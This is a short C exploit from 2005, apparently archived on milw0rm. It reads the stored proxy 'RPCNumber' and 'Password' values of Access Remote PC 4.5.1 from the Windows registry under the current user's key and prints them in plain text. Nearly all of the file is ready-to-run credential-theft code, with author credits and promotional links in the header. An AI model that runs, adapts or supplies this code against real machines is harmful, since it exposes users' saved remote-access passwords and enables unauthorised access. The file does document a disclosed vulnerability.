/*****************************************************************

Access Remote PC 4.5.1 Local Password Disclosure Exploit by Kozan

Application: Access Remote PC 4.5.1 (and probably prior versions)
Vendor: www.access-remote-pc.com

Vulnerable Description: Access Remote PC 4.5.1 discloses passwords
to local users.

Discovered & Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*****************************************************************/

#include <windows.h>
#include <stdio.h>

#define BUF 100

int main()
{
       HKEY hKey;
       char RPCNumber[BUF], Password[BUF];
       DWORD dwBuf = BUF;

       if( RegOpenKeyEx( HKEY_CURRENT_USER,
                         "Software\\Access Remote PC\\Client\\Options\\Proxy",
                         0,
                         KEY_QUERY_VALUE,
                         &hKey
                         ) !=ERROR_SUCCESS )
       {
               fprintf( stdout, "Access Remote PC is not installed on you PC!\n" );
               return -1;
       }

       if( RegQueryValueEx( hKey,
                            "RPCNumber",
                            NULL,
                            NULL,
                            (BYTE *)&RPCNumber,
                            &dwBuf
                            ) != ERROR_SUCCESS )
       lstrcpy( RPCNumber,"Not Found!\n" );

       if( RegQueryValueEx( hKey,
                            "Password",
                            NULL,
                            NULL,
                            (BYTE *)&Password,
                            &dwBuf
                            ) != ERROR_SUCCESS )
       lstrcpy( Password,"Not Found!\n" );

       fprintf( stdout, "Access Remote PC 4.5.1 Local Exploit by Kozan\n" );
       fprintf( stdout, "Credits to AtmaCA\n" );
       fprintf( stdout, "www.netmagister.com - www.spyinstructors.com \n" );
       fprintf( stdout, "kozan@netmagister.com\n\n" );
       fprintf( stdout, "RPCNumber\t: %s\n", RPCNumber );
       fprintf( stdout, "Password\t: %s\n", Password );

       return 0;
}

// milw0rm.com [2005-07-04]